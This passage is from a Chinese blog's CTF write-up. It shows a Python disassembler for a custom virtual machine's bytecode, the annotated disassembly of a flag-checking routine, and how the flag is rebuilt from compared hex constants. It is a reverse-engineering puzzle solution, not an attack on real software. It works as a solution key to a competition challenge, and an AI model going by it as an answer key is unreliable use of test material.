class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">57</span>, <span class="number">41</span>, <span class="number">117</span>, <span class="number">27</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">30</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">45</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">131</span>, <span class="number">141</span>, <span class="number">181</span>, <span class="number">46</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">2</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>]</span><br><span class="line"></span><br><span class="line">opcodes = &#123;</span><br><span class="line">  <span class="number">67</span>: (<span class="string">"return result"</span>, <span class="number">1</span>),</span><br><span class="line">  <span class="number">68</span>: (<span class="string">"j_flag_neg1"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">69</span>: (<span class="string">"mod_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">70</span>: (<span class="string">"load_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">71</span>: (<span class="string">"xor_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">72</span>: (<span class="string">"cmp_hi_to_lo"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">73</span>: (<span class="string">"inc_mem_ptr"</span>, <span class="number">1</span>),</span><br><span class="line">  <span class="number">74</span>: (<span class="string">"and_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">75</span>: (<span class="string">"j_not_flag"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">76</span>: (<span class="string">"xor_block"</span>, <span class="number">16</span>),</span><br><span class="line">  <span class="number">77</span>: (<span class="string">"j_flag_1"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">78</span>: (<span class="string">"dec_assign_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">79</span>: (<span class="string">"push"</span>, <span class="number">5</span>),</span><br><span class="line">  <span class="number">80</span>: (<span class="string">"inc_assign_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">81</span>: (<span class="string">"assign_lo_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">82</span>: (<span class="string">"push hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">83</span>: (<span class="string">"add_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">84</span>: (<span class="string">"pop hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">85</span>: (<span class="string">"jmp_bck_cnt"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">86</span>: (<span class="string">"dec_mem_ptr"</span>, <span class="number">1</span>),</span><br><span class="line">  <span class="number">87</span>: (<span class="string">"store hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">88</span>: (<span class="string">"mul_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">89</span>: (<span class="string">"subs_to_hi"</span>, <span class="number">2</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pc = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> pc != len(code):</span><br><span class="line">  opcode = code[pc]</span><br><span class="line">  name = opcodes[opcode][<span class="number">0</span>]</span><br><span class="line">  length = opcodes[opcode][<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"%03x\t"</span> % pc,</span><br><span class="line">  <span class="keyword">print</span> name,</span><br><span class="line">  <span class="keyword">if</span> length == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    pc += <span class="number">1</span></span><br><span class="line">  <span class="keyword">elif</span> length == <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'hi'</span> <span class="keyword">in</span> name:</span><br><span class="line">      <span class="keyword">print</span> code[pc+<span class="number">1</span>] &gt;&gt; <span class="number">4</span>, code[pc+<span class="number">1</span>] &amp; <span class="number">0xf</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">print</span> hex(code[pc+<span class="number">1</span>])</span><br><span class="line">    pc += <span class="number">2</span></span><br><span class="line">  <span class="keyword">elif</span> length == <span class="number">5</span>:</span><br><span class="line">    num = (code[pc+<span class="number">1</span>] &lt;&lt; <span class="number">24</span>) | (code[pc+<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (code[pc+<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | (code[pc+<span class="number">4</span>] &lt;&lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(num)</span><br><span class="line">    pc += <span class="number">5</span></span><br><span class="line">  <span class="keyword">elif</span> length == <span class="number">16</span>:</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">      code[i + pc + <span class="number">1</span>] ^= <span class="number">0x66</span></span><br><span class="line">    pc += <span class="number">16</span></span><br></pre></td></tr></table></figure>
<p>运行得到如下输出（输出中注释是分析过程）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line">000 push 0x2f</span><br><span class="line">005 jmp_bck_cnt 0x5</span><br><span class="line">007 pop hi 3 0</span><br><span class="line">009 load_to_hi 0 0</span><br><span class="line">00b xor_to_hi 2 2</span><br><span class="line">00d cmp_hi_to_lo 0 2</span><br><span class="line">00f j_not_flag 0x33 =&gt; 0x44</span><br><span class="line">011 inc_mem_ptr</span><br><span class="line">012 push 0x46</span><br><span class="line">017 pop hi 1 0</span><br><span class="line">019 cmp_hi_to_lo 0 1</span><br><span class="line">01b j_flag_1 0x27 =&gt; 0x44</span><br><span class="line">01d push 0x30</span><br><span class="line">022 pop hi 1 0</span><br><span class="line">024 cmp_hi_to_lo 0 1</span><br><span class="line">026 j_flag_neg1 0x16 =&gt; 0x3e</span><br><span class="line">028 push 0x39</span><br><span class="line">02d pop hi 1 0</span><br><span class="line">02f cmp_hi_to_lo 0 1</span><br><span class="line">031 j_flag_neg1 0xb =&gt; 0x3e</span><br><span class="line">033 push 0x41</span><br><span class="line">038 pop hi 0 1</span><br><span class="line">03a cmp_hi_to_lo 0 1</span><br><span class="line">03c j_flag_neg1 0x6 =&gt; 0x44</span><br><span class="line">03e xor_to_hi 0 0</span><br><span class="line">040 cmp_hi_to_lo 0 0</span><br><span class="line">042 j_not_flag 0x5 =&gt; 0x49</span><br><span class="line">fail:</span><br><span class="line">044 xor_to_hi 0 0</span><br><span class="line">046 inc_assign_hi 0 0</span><br><span class="line">048 return result</span><br><span class="line">049 jmp_bck_cnt 0x40</span><br><span class="line">(check hex digits)</span><br><span class="line"></span><br><span class="line">04b push 0x7</span><br><span class="line">050 pop hi 3 0      // cnt = 0x7</span><br><span class="line">052 xor_to_hi 1 1   // reg[1] = 0</span><br><span class="line">back:</span><br><span class="line">054 dec_mem_ptr</span><br><span class="line">055 load_to_hi 0 0  // reg[0] = c</span><br><span class="line">057 push 0x30</span><br><span class="line">05c pop hi 2 0      // reg[2] = 0x30</span><br><span class="line">05e subs_to_hi 0 2  // c-=0x30</span><br><span class="line">060 push 0xa</span><br><span class="line">065 pop hi 2 0      // reg[2] = 10</span><br><span class="line">067 cmp_hi_to_lo 0 2</span><br><span class="line">069 j_flag_neg1 0x9 // c &lt; 10 =&gt; less_than_10</span><br><span class="line">06b push 0x7</span><br><span class="line">070 pop hi 2 0      // reg[2] = 7</span><br><span class="line">072 subs_to_hi 0 2  // c-=7</span><br><span class="line">less_than_10:</span><br><span class="line">074 push 0x10</span><br><span class="line">079 pop hi 2 0</span><br><span class="line">07b mul_to_hi 1 2   i &lt;&lt; 4</span><br><span class="line">07d add_to_hi 1 0   i += c</span><br><span class="line">07f jmp_bck_cnt 0x2b =&gt; back</span><br><span class="line">081 push 0x33b488ac</span><br><span class="line">086 pop hi 2 0</span><br><span class="line">088 cmp_hi_to_lo 1 2</span><br><span class="line">08a xor_to_hi 0 0</span><br><span class="line">08c j_not_flag 0x3</span><br><span class="line">08e inc_assign_hi 0 0</span><br><span class="line">090 return result</span><br><span class="line">(后七个字符为 &quot;33b488ac&quot;[::-1])</span><br><span class="line"></span><br><span class="line">091 push 0x7</span><br><span class="line">096 pop hi 3 0</span><br><span class="line">098 xor_to_hi 1 1</span><br><span class="line">09a dec_mem_ptr</span><br><span class="line">09b load_to_hi 0 0</span><br><span class="line">09d push 0x30</span><br><span class="line">0a2 pop hi 2 0</span><br><span class="line">0a4 subs_to_hi 0 2</span><br><span class="line">0a6 push 0xa</span><br><span class="line">0ab pop hi 2 0</span><br><span class="line">0ad cmp_hi_to_lo 0 2</span><br><span class="line">0af j_flag_neg1 0x9</span><br><span class="line">0b1 push 0x7</span><br><span class="line">0b6 pop hi 2 0</span><br><span class="line">0b8 subs_to_hi 0 2</span><br><span class="line">0ba push 0x10</span><br><span class="line">0bf pop hi 2 0</span><br><span class="line">0c1 mul_to_hi 1 2</span><br><span class="line">0c3 add_to_hi 1 0</span><br><span class="line">0c5 jmp_bck_cnt 0x2b</span><br><span class="line">0c7 push 0x4a0b943f</span><br><span class="line">0cc pop hi 2 0</span><br><span class="line">0ce cmp_hi_to_lo 1 2</span><br><span class="line">0d0 xor_to_hi 0 0</span><br><span class="line">0d2 j_not_flag 0x3</span><br><span class="line">0d4 inc_assign_hi 0 0</span><br><span class="line">0d6 return result</span><br><span class="line">0d7 push 0x7</span><br><span class="line">0dc pop hi 3 0</span><br><span class="line">0de xor_to_hi 1 1</span><br><span class="line">0e0 dec_mem_ptr</span><br><span class="line">0e1 load_to_hi 0 0</span><br><span class="line">0e3 push 0x30</span><br><span class="line">0e8 pop hi 2 0</span><br><span class="line">0ea subs_to_hi 0 2</span><br><span class="line">0ec push 0xa</span><br><span class="line">0f1 pop hi 2 0</span><br><span class="line">0f3 cmp_hi_to_lo 0 2</span><br><span class="line">0f5 j_flag_neg1 0x9</span><br><span class="line">0f7 push 0x7</span><br><span class="line">0fc pop hi 2 0</span><br><span class="line">0fe subs_to_hi 0 2</span><br><span class="line">100 push 0x10</span><br><span class="line">105 pop hi 2 0</span><br><span class="line">107 mul_to_hi 1 2</span><br><span class="line">109 add_to_hi 1 0</span><br><span class="line">10b jmp_bck_cnt 0x2b</span><br><span class="line">10d push 0x7c5cdcec</span><br><span class="line">112 pop hi 2 0</span><br><span class="line">114 cmp_hi_to_lo 1 2</span><br><span class="line">116 xor_to_hi 0 0</span><br><span class="line">118 j_not_flag 0x3</span><br><span class="line">11a inc_assign_hi 0 0</span><br><span class="line">11c return result</span><br><span class="line">11d push 0x7</span><br><span class="line">122 pop hi 3 0</span><br><span class="line">124 xor_to_hi 1 1</span><br><span class="line">126 dec_mem_ptr</span><br><span class="line">127 load_to_hi 0 0</span><br><span class="line">129 push 0x30</span><br><span class="line">12e pop hi 2 0</span><br><span class="line">130 subs_to_hi 0 2</span><br><span class="line">132 push 0xa</span><br><span class="line">137 pop hi 2 0</span><br><span class="line">139 cmp_hi_to_lo 0 2</span><br><span class="line">13b j_flag_neg1 0x9</span><br><span class="line">13d push 0x7</span><br><span class="line">142 pop hi 2 0</span><br><span class="line">144 subs_to_hi 0 2</span><br><span class="line">146 push 0x10</span><br><span class="line">14b pop hi 2 0</span><br><span class="line">14d mul_to_hi 1 2</span><br><span class="line">14f add_to_hi 1 0</span><br><span class="line">151 jmp_bck_cnt 0x2b</span><br><span class="line">153 push 0x3929751b</span><br><span class="line">158 pop hi 2 0</span><br><span class="line">15a cmp_hi_to_lo 1 2</span><br><span class="line">15c xor_to_hi 0 0</span><br><span class="line">15e j_not_flag 0x3</span><br><span class="line">160 inc_assign_hi 0 0</span><br><span class="line">162 return result</span><br><span class="line">163 push 0x7</span><br><span class="line">168 pop hi 3 0</span><br><span class="line">16a xor_to_hi 1 1</span><br><span class="line">16c dec_mem_ptr</span><br><span class="line">16d load_to_hi 0 0</span><br><span class="line">16f push 0x30</span><br><span class="line">174 pop hi 2 0</span><br><span class="line">176 subs_to_hi 0 2</span><br><span class="line">178 push 0xa</span><br><span class="line">17d pop hi 2 0</span><br><span class="line">17f cmp_hi_to_lo 0 2</span><br><span class="line">181 j_flag_neg1 0x9</span><br><span class="line">183 push 0x7</span><br><span class="line">188 pop hi 2 0</span><br><span class="line">18a subs_to_hi 0 2</span><br><span class="line">18c push 0x10</span><br><span class="line">191 pop hi 2 0</span><br><span class="line">193 mul_to_hi 1 2</span><br><span class="line">195 add_to_hi 1 0</span><br><span class="line">197 jmp_bck_cnt 0x2b</span><br><span class="line">199 push 0x1ef26b2d</span><br><span class="line">19e pop hi 2 0</span><br><span class="line">1a0 cmp_hi_to_lo 1 2</span><br><span class="line">1a2 xor_to_hi 0 0</span><br><span class="line">1a4 j_not_flag 0x3</span><br><span class="line">1a6 inc_assign_hi 0 0</span><br><span class="line">1a8 return result</span><br><span class="line">1a9 push 0x7</span><br><span class="line">1ae pop hi 3 0</span><br><span class="line">1b0 xor_to_hi 1 1</span><br><span class="line">1b2 dec_mem_ptr</span><br><span class="line">1b3 load_to_hi 0 0</span><br><span class="line">1b5 push 0x30</span><br><span class="line">1ba pop hi 2 0</span><br><span class="line">1bc subs_to_hi 0 2</span><br><span class="line">1be push 0xa</span><br><span class="line">1c3 pop hi 2 0</span><br><span class="line">1c5 cmp_hi_to_lo 0 2</span><br><span class="line">1c7 j_flag_neg1 0x9</span><br><span class="line">1c9 push 0x7</span><br><span class="line">1ce pop hi 2 0</span><br><span class="line">1d0 subs_to_hi 0 2</span><br><span class="line">1d2 push 0x10</span><br><span class="line">1d7 pop hi 2 0</span><br><span class="line">1d9 mul_to_hi 1 2</span><br><span class="line">1db add_to_hi 1 0</span><br><span class="line">1dd jmp_bck_cnt 0x2b</span><br><span class="line">1df push 0x838db52e</span><br><span class="line">1e4 pop hi 2 0</span><br><span class="line">1e6 cmp_hi_to_lo 1 2</span><br><span class="line">1e8 xor_to_hi 0 0</span><br><span class="line">1ea j_not_flag 0x2</span><br><span class="line">1ec inc_assign_hi 0 0</span><br><span class="line">1ee return result</span><br></pre></td></tr></table></figure>
<p>分析到 090 观察到下面都是类似的代码结构，之后直接还原 flag 就可以了，只需要把比较的十六进制字符串按端序从后往前拼接起来得到 flag。</p>
<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://laucyun.com/3411bc6f400207178b85defa04474b4a.html" target="_blank" rel="noopener">https://laucyun.com/3411bc6f400207178b85defa04474b4a.html</a><br><a href="https://spaces.ac.cn/archives/1907" target="_blank" rel="noopener">https://spaces.ac.cn/archives/1907</a><br><a href="https://math.stackexchange.com/questions/1791562/converting-0-1-to-binary-64-bit-double" target="_blank" rel="noopener">https://math.stackexchange.com/questions/1791562/converting-0-1-to-binary-64-bit-double</a><br><a href="https://xz.aliyun.com/t/2897" target="_blank" rel="noopener">https://xz.aliyun.com/t/2897</a><br><a href="https://blog.csdn.net/qq_33438733/article/details/83044151" target="_blank" rel="noopener">https://blog.csdn.net/qq_33438733/article/details/83044151</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/">wp</a></li></ul>

      
        
	<div id="comment">
		<!-- 来必力City版安装代码 -->
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
		<script type="text/javascript">
		   (function(d, s) {
		       var j, e = d.getElementsByTagName(s)[0];

		       if (typeof LivereTower === 'function') { return; }

		       j = d.createElement(s);
		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
		       j.async = true;

		       e.parentNode.insertBefore(j, e);
		   })(document, 'script');
		</script>
		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
		</div>
		<!-- City版安装代码已完成 -->
	</div>



      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2018/11/06/合天网安实验室-逆向部分/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          合天网安实验室-逆向部分
        
      </div>
    </a>
  
  
    <a href="/2018/09/12/2018-网鼎杯/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">2018-网鼎杯</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Contents</strong>
    
      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#迟到的签到题"><span class="nav-number">1.</span> <span class="nav-text">迟到的签到题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FEZ"><span class="nav-number">2.</span> <span class="nav-text">FEZ</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GETTINGSTART"><span class="nav-number">3.</span> <span class="nav-text">GETTINGSTART</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RERERE"><span class="nav-number">4.</span> <span class="nav-text">RERERE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考网站"><span class="nav-number">5.</span> <span class="nav-text">参考网站</span></a></li></ol>
    
    </div>
  </aside>
</section>
        
      </div>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      &copy; 2019 AssassinQ All Rights Reserved.
        
      </div>
      <div class="site-credit">
        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";


    <!-- headerblur min height -->
    
      var headerblur = document.getElementById("header-blur");
      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
    
    
</script>
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>







  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>








  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
</body>
</html>
